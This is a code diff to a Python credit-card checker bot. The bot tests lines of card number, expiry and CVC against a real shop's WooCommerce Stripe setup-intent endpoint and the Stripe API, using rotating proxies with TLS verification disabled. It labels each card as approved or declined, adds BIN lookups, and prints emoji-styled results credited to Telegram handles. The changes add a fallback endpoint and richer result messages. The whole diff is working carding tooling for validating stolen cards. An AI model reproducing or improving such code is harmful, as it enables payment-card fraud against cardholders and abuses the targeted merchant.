@@ -95,6 +95,9 @@ def get_bin_info(bin_number):
         }
 
 def classify_response(res):
+    if isinstance(res, str):
+        return "DECLINED CC", res, False
+        
     raw_text = json.dumps(res).lower()
     
     if res.get("status") == "succeeded":
@@ -122,33 +125,66 @@ def check_card_stripe(cc_line):
         # Get proxy
         proxy = get_random_proxy()
         
-        # Get setup intent
-        setup = requests.post(
+        # Get setup intent - try multiple endpoints
+        endpoints = [
             "https://shopzone.nz/?wc-ajax=wc_stripe_frontend_request&path=/wc-stripe/v1/setup-intent",
-            data={"payment_method": "stripe_cc"},
-            headers={
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
-                "Accept": "application/json",
-                "Content-Type": "application/x-www-form-urlencoded"
-            },
-            proxies=proxy,
-            timeout=30,
-            verify=False
-        )
+            "https://api.stripe.com/v1/setup_intents"
+        ]
         
-        if setup.status_code != 200:
-            return f"❌ Setup failed. Status: {setup.status_code}"
-            
-        setup_data = setup.json()
-        client_secret = setup_data.get("client_secret", "")
-        if not client_secret:
-            return "❌ Failed to get client secret"
-            
-        secret_parts = client_secret.split("_secret_")
-        if len(secret_parts) < 2:
-            return "❌ Invalid client secret format"
-            
-        secret = secret_parts[0]
+        setup = None
+        client_secret = ""
+        secret = ""
+        
+        for endpoint in endpoints:
+            try:
+                setup = requests.post(
+                    endpoint,
+                    data={"payment_method": "stripe_cc"},
+                    headers={
+                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
+                        "Accept": "application/json",
+                        "Content-Type": "application/x-www-form-urlencoded"
+                    },
+                    proxies=proxy,
+                    timeout=30,
+                    verify=False
+                )
+                
+                if setup.status_code == 200:
+                    try:
+                        setup_data = setup.json()
+                        client_secret = setup_data.get("client_secret", "")
+                        if client_secret:
+                            secret_parts = client_secret.split("_secret_")
+                            if len(secret_parts) >= 2:
+                                secret = secret_parts[0]
+                                break
+                    except:
+                        # Try to extract from text response
+                        if "client_secret" in setup.text:
+                            match = re.search(r'"client_secret":"([^"]+)"', setup.text)
+                            if match:
+                                client_secret = match.group(1)
+                                secret_parts = client_secret.split("_secret_")
+                                if len(secret_parts) >= 2:
+                                    secret = secret_parts[0]
+                                    break
+            except:
+                continue
+        
+        if not client_secret or not secret:
+            elapsed_time = time.time() - start_time
+            return f"""
+❌ SETUP FAILED ❌
+
+💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Failed to get client secret from Stripe
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth
+
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
 
         # Confirm the setup intent with card details
         confirm = requests.post(
@@ -176,15 +212,33 @@ def check_card_stripe(cc_line):
         elapsed_time = time.time() - start_time
         
         if confirm.status_code != 200:
-            return f"❌ Confirmation failed. Status: {confirm.status_code}"
+            try:
+                error_data = confirm.json()
+                error_msg = error_data.get("error", {}).get("message", "Unknown error")
+            except:
+                error_msg = f"Status: {confirm.status_code}"
+                
+            return f"""
+❌ CONFIRMATION FAILED ❌
+
+💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {error_msg}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth
+
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
             
         response_data = confirm.json()
         status, reason, approved = classify_response(response_data)
         bin_info = get_bin_info(n[:6])
         
         # Format the response similar to your p.py format
+        status_icon = '✅' if approved else '❌'
+        
         response_text = f"""
-{status} {'❌' if not approved else '✅'}
+{status} {status_icon}
 
 💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {reason}
@@ -201,7 +255,17 @@ def check_card_stripe(cc_line):
 
     except Exception as e:
         elapsed_time = time.time() - start_time
-        return f"❌ Error: {str(e)}"
+        return f"""
+❌ ERROR ❌
+
+💳𝗖𝗖 ⇾ {cc_line if 'cc_line' in locals() else 'N/A'}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {str(e)}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth
+
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
 
 def check_cards_stripe(cards_list):
     """Check multiple cards using Stripe gateway"""
